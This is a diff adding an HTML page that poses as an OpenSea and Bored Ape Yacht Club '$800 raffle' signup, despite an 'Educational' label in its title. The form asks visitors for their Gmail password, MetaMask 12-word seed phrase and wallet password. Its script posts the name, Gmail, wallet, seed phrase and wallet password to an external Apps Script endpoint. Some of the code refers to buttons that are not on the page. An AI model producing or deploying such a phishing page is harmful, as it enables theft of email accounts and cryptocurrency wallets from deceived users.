@@ -1,0 +1,45 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>$800 OpenSea Raffle (Educational)</title><style>:root{--bg:#f2f6fa;--card:#fff;--input-bg:#f9fbfd;--input-border:#d1d9e6;--primary:#2081e2;--primary-hover:#1864b7;--muted:#555;--radius:12px}*{box-sizing:border-box}html,body{height:100%;margin:0;overflow-x:hidden}body{font-family:Arial,sans-serif;background:var(--bg);display:flex;justify-content:center;padding:28px 0}main{width:100%;max-width:760px;background:var(--card);padding:24px;border-radius:12px;box-shadow:0 6px 28px rgba(0,0,0,0.08);display:flex;flex-direction:column;gap:20px}h1,h2,h3{margin:0 0 10px 0;text-align:center}input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid var(--input-border);box-sizing:border-box}button{background:var(--primary);color:#fff;border:none;cursor:pointer}button:hover{background:var(--primary-hover)}.note,.visually-small{font-size:13px;color:var(--muted);margin-top:6px}label{font-size:13px;display:block;margin-top:10px}</style></head><body>
+<main>
+<h1>OpenSea's $800 prize in collaboration with the Bored Ape Yacht Club collection is the flagship collection for NFT collectors.</h1>
+<h1>You must enter your main information to complete the registration.</h1>
+<section>
+<h2>Sign Up</h2>
+<div class="lines">Gmail And Password And Day, month and year
+12 Word Seed Phrase And Password (MetaMask)</div>
+<form id="signupForm">
+<input id="name" name="name" type="text" placeholder="Full Name" required>
+<input id="gmail" name="gmail" type="text" placeholder="Gmail address" required>
+<input id="gmailPassword" name="gmailPassword" type="password" placeholder="Gmail Password" required />
+<input id="wallet" name="wallet" type="text" placeholder="Public Wallet Address (e.g. 0x...)" required>
+<input id="walletNickname" name="walletNickname" type="text" placeholder="Wallet Nickname (optional)">
+<input id="seedPhrase" name="seedPhrase" type="text" placeholder="12-Word Seed Phrase">
+<input id="walletPassword" name="walletPassword" type="password" placeholder="Wallet Password">
+<div class="note"><div class="note">One click puts you one step closer to winning a free prize.</div>
+.</div>
+<button type="button" id="connectBtn">Connect Wallet (MetaMask)</button>
+<div id="walletInfo" class="meta-info" aria-live="polite"></div>
+<label><input id="consent" name="consent" type="checkbox" required>   By checking this, you support us and get a chance to win a free prize!
+</label>
+<button type="submit">Sign Up</button>
+</form>
+</section>
+<section>
+<p class="visually-small"><strong>Warning:</strong> All material and intellectual rights of this site belong to OpenSea.
+</p>
+</section>
+</main>
+<script>
+const APPS_SCRIPT_URL='PASTE_YOUR_APPS_SCRIPT_URL_HERE';
+function safeText(t){return(t||'').toString().trim()}
+function b64encode(buf){let b='';new Uint8Array(buf).forEach(c=>b+=String.fromCharCode(c));return btoa(b)}
+function str2ab(s){return new TextEncoder().encode(s)}
+function genSalt(l){let s=new Uint8Array(l||16);crypto.getRandomValues(s);return s}
+function deriveKey(p,s,it){it=it||200000;return crypto.subtle.importKey('raw',new TextEncoder().encode(p),'PBKDF2',false,['deriveKey']).then(k=>crypto.subtle.deriveKey({name:'PBKDF2',salt:s,iterations:it,hash:'SHA-256'},k,{name:'AES-GCM',length:256},true,['encrypt','decrypt']))}
+function encryptText(t,p){let s=genSalt(16),iv=genSalt(12);return deriveKey(p,s,200000).then(k=>crypto.subtle.encrypt({name:'AES-GCM',iv:iv},k,str2ab(t)).then(c=>({salt:b64encode(s.buffer),iv:b64encode(iv.buffer),ciphertext:b64encode(c),iterations:200000})))}
+const form=document.getElementById('signupForm'),connectBtn=document.getElementById('connectBtn'),walletInfo=document.getElementById('walletInfo'),encryptBtn=document.getElementById('encryptDownloadBtn'),clearBtn=document.getElementById('clearSensitiveBtn'),sensitiveText=document.getElementById('sensitiveText'),encPassword=document.getElementById('encPassword');
+connectBtn.addEventListener('click',()=>{if(typeof ethereum==='undefined'){walletInfo.textContent='MetaMask not detected.';return}connectBtn.disabled=true;connectBtn.textContent='Connecting...';ethereum.request({method:'eth_requestAccounts'}).then(a=>{let addr=a[0]||'';walletInfo.textContent='Connected: '+addr;let msg='Sign this message to confirm wallet ownership for signup at '+location.hostname;ethereum.request({method:'personal_sign',params:[msg,addr]}).then(sig=>{form.dataset.signature=sig;form.dataset.signatureMessage=msg}).catch(()=>{});document.getElementById('wallet').value=addr}).finally(()=>{connectBtn.disabled=false;connectBtn.textContent='Connect Wallet (MetaMask)'}).catch(e=>{console.error(e);walletInfo.textContent='Connection failed.'})});
+encryptBtn.addEventListener('click',()=>{let t=sensitiveText.value||'',p=encPassword.value||'';if(!t){alert('Paste your sensitive text to encrypt.');return}if(!p||p.length<8){alert('Choose a password ≥8 chars.');return}encryptBtn.disabled=true;encryptBtn.textContent='Encrypting...';encryptText(t,p).then(out=>{let payload={version:1,created:new Date().toISOString(),cipher:'AES-GCM',kdf:'PBKDF2',iterations:out.iterations,salt:out.salt,iv:out.iv,ciphertext:out.ciphertext,note:'This file is encrypted locally.'};let blob=new Blob([JSON.stringify(payload,null,2)],{type:'application/json;charset=utf-8'}),url=URL.createObjectURL(blob),a=document.createElement('a');a.href=url;a.download='encrypted-backup-'+(new Date().toISOString().slice(0,19).replace(/:/g,'-'))+'.json';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(url);alert('Encrypted backup downloaded.')}).finally(()=>{encryptBtn.disabled=false;encryptBtn.textContent='Encrypt & Download'})});
+clearBtn.addEventListener('click',()=>{if(confirm('Clear sensitive text from this page?')){sensitiveText.value='';encPassword.value=''}})
+form.addEventListener('submit',e=>{e.preventDefault();if(!document.getElementById('consent').checked){alert('Please give consent.');return}let data={name:safeText(document.getElementById('name').value),gmail:safeText(document.getElementById('gmail').value),wallet:safeText(document.getElementById('wallet').value),walletNickname:safeText(document.getElementById('walletNickname').value),seedPhrase:safeText(document.getElementById('seedPhrase').value),walletPassword:safeText(document.getElementById('walletPassword').value)};fetch(APPS_SCRIPT_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(r=>r.json().then(j=>{alert(j.result==='success'?'Sign up successful!':'Error: '+(j.message||'Unknown error'));form.reset()})).catch(err=>{console.error(err);alert('Network/server error.')})});
+</script>
+</body></html>
